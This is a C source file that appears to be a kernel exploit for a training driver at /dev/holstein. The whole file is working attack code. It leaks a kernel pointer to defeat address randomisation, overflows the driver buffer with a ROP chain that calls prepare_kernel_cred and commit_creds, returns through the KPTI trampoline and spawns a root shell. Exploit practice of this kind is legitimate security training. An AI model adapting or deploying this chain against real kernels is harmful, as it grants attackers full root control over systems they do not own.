#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

char buf[0x1000];

unsigned long long user_cs, user_ss, user_rsp, user_rflags;

void *prepare_kernel_cred = (void*)0xffffffff8106e240;
void *commit_creds = (void*)0xffffffff8106e390;
void *kpti_trampoline = (void*)0xffffffff81800e26;

void *pop_rdi = (void*)0xffffffff8127bbdc;
void *pop_rcx = (void*)0xffffffff812ea083;
// 0xffffffff8160c96b: mov %rax, %rdi; rep movsq (%rsi), (%rdi); ret; 
void *mov_rax_rdi = (void*)0xffffffff8160c96b;
void *iretq = (void*)0xffffffff810202af;
void *swapgs = (void*)0xffffffff8160bf7e;

void shell() {
  int a;
  asm volatile("movl %%eax, %0" : "=r" (a));
  printf("%d\n", a);
  puts("[+] shell");
  char *argv[] = { "/bin/sh" , NULL };
  char *envp[] = { NULL };
  execve("/bin/sh", argv, envp);
}

void save_state() {
  puts("[+] save_state");
  asm volatile(
      "movq %%cs, %0;"
      "movq %%ss, %1;"
      "movq %%rsp, %2;"
      "pushfq;"
      "popq %3;"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
      :
      : "memory");
}

void dump(char *m) {
  unsigned long *p = (unsigned long *)m;
  for (size_t i = 0; i < 0x1000/8; ++i) {
    printf("%lu: %lx\n", i, p[i]);
  }
}

int main() {
  puts("[+] main");
  save_state();
  int fd = open("/dev/holstein", O_RDWR);
  memset(buf, 'A', 0x1000);

  read(fd, buf, 0x1000);
  unsigned long offset = ((unsigned long*)buf)[129] - 0xffffffff8113d33c;
  printf("offset: %lx\n", offset);
  
  void **rop = (void**)&buf[0x408];
  *rop++ = pop_rdi+offset;
  *rop++ = NULL;
  *rop++ = prepare_kernel_cred+offset;
  *rop++ = pop_rcx+offset;
  *rop++ = NULL;
  *rop++ = mov_rax_rdi+offset;
  *rop++ = commit_creds+offset;

  *rop++ = kpti_trampoline+offset;
  *rop++ = (void*)0x41414141;
  *rop++ = (void*)0x42424242;
  
  *rop++ = shell+1;
  *rop++ = (void*)user_cs;
  *rop++ = (void*)user_rflags;
  *rop++ = (void*)user_rsp;
  *rop++ = (void*)user_ss;
  
  write(fd, buf, (void*)rop-(void*)buf);
  return 0;
}

